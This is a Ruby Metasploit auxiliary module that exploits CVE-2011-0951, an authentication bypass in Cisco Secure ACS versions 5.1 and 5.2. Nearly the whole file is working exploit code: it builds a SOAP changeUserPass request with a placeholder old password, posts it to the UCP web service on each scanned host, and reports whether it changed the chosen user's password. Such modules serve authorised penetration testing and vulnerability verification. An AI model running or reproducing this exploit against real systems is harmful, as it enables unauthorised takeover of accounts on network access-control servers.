##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit4 < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner

  def initialize(info = {})
    super(update_info(info,
      'Name'         => 'Cisco Secure ACS Unauthorized Password Change',
      'Description'  => %q{
        This module exploits an authentication bypass issue which allows arbitrary
        password change requests to be issued for any user in the local store.
        Instances of Secure ACS running version 5.1 with patches 3, 4, or 5 as well
        as version 5.2 with either no patches or patches 1 and 2 are vulnerable.
        },
      'References'     =>
        [
          ['BID', '47093'],
          ['CVE', '2011-0951'],
          ['URL', 'http://www.cisco.com/en/US/products/csa/cisco-sa-20110330-acs.html']
        ],
      'Author'         =>
        [
          'Jason Kratzer <pyoor[at]flinkd.org>'
        ],
      'License'      => MSF_LICENSE
    ))

    register_options(
      [
        Opt::RPORT(443),
        OptString.new('TARGETURI', [true, 'Path to UCP WebService', '/PI/services/UCP/']),
        OptString.new('USERNAME', [true, 'Username to use', '']),
        OptString.new('PASSWORD', [true, 'Password to use', '']),
        OptBool.new('SSL', [true, 'Use SSL', true])
      ], self.class)
  end

  def run_host(ip)
    soapenv='http://schemas.xmlsoap.org/soap/envelope/'
    soapenvenc='http://schemas.xmlsoap.org/soap/encoding/'
    xsi='http://www.w3.org/1999/XMLSchema-instance'
    xsd='http://www.w3.org/1999/XMLSchema'
    ns1='ns1:changeUserPass'

    data = '<?xml version="1.0" encoding="utf-8"?>' + "\r\n"
    data << '<SOAP-ENV:Envelope SOAP-ENV:encodingStyle="' + soapenvenc + '" '
    data << 'xmlns:SOAP-ENC="' + soapenvenc + '" '
    data << 'xmlns:xsi="' + xsi + '" xmlns:SOAP-ENV="' + soapenv + '" '
    data << 'xmlns:xsd="' + xsd + '">' + "\r\n"

    data << '<SOAP-ENV:Body>' + "\r\n"
    data << '<ns1:changeUserPass xmlns:ns1="UCP" SOAP-ENC:root="1">' + "\r\n"
    data << '<v1 xsi:type="xsd:string">' + datastore['USERNAME'] + '</v1>' + "\r\n"
    data << '<v2 xsi:type="xsd:string">fakepassword</v2>' + "\r\n"
    data << '<v3 xsi:type="xsd:string">' + datastore['PASSWORD'] + '</v3>' + "\r\n"
    data << '</ns1:changeUserPass>'
    data << '</SOAP-ENV:Body>' + "\r\n"
    data << '</SOAP-ENV:Envelope>' + "\r\n\r\n"

    print_status("Issuing password change request for: " + datastore['USERNAME'])

    begin
      uri = normalize_uri(target_uri.path)
      uri << '/' if uri[-1,1] != '/'
      res = send_request_cgi({
        'uri'     => uri,
        'method'  => 'POST',
        'data'    => data,
        'headers' =>
          {
            'SOAPAction' => '"changeUserPass"',
          }
      }, 60)

    rescue ::Rex::ConnectionError
      print_error("#{rhost}:#{rport} [ACS] Unable to communicate")
      return :abort
    end

    if not res
      print_error("#{rhost}:#{rport} [ACS] Unable to connect")
      return
    elsif res.code == 200
      body = res.body
      if body.match(/success/i)
        print_good("#{rhost} - Success! Password has been changed.")
      elsif body.match(/Password has already been used/)
        print_error("#{rhost} - Failed! The supplied password has already been used.")
        print_error("Please change the password and try again.")
      elsif body.match(/Invalid credntials for user/)
        print_error("#{rhost} - Failed! Either the username does not exist or target is not vulnerable.")
        print_error("Please change the username and try again.")
      else
        print_error("#{rhost} - Failed!  An unknown error has occurred.")
      end
    else
      print_error("#{rhost} - Failed! The webserver issued a #{res.code} response.")
      print_error("Please validate the TARGETURI option and try again.")
    end

  end
end
